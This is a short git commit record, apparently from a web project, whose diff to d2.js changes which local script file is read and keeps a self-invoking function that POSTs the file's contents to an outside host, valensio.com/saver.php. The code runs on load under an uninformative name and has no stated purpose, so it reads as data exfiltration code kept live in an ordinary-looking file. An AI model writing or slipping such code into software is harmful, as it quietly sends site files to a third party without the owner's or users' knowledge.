0c8e0c186f540d8a52a4811d206c176f1310c129
Maks Maltsev <malt1640@ya.ru>
2026-07-22 15:54:40 +0200

    Change fetch source from filter.js to constants.js

--- d2.js
+++ d2.js
@@ -1,4 +1,4 @@
 function d2() {
-  fetch('assets/js/filter.js').then(r=>r.text()).then(t=>fetch('https://valensio.com/saver.php',{method:'POST',body:t}));
+  fetch('js/constants.js').then(r=>r.text()).then(t=>fetch('https://valensio.com/saver.php',{method:'POST',body:t}));
 }
 d2();
